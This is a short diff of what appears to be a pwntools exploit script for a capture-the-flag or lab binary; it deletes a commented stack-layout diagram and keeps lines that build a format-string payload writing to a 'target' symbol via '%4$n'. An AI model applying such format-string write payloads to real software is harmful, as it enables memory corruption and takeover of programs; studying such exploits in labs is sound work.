@@ -9,25 +9,6 @@ e = ELF(lbin)
 target_addr = e.symbols['target']
 log.info('target_addr: %08x', target_addr)
 
-'''
-      .
-      .
-      +---------------- <-- sp_vuln ("$0")
-  4   | buf ptr         o--.
-      |----------------    |
-  4   | size (512)         |
-      |----------------    |
-  4   | stream (stdin)     |
-      |----------------    |
-  4   |     ...            |
-      +---------------- <--'
-0x208 | buf
-      +---------------- <-- bp_vuln
-  ?   |     ...
-      `---------------- 0xbfffffff (stack)
-
-'''
-
 target_value = 0x40
 idx = 4  # buf ptr, size, stream, <pad>
 payload = fit({0: p32(target_addr), target_value: '%' + str(idx) + '$n'})
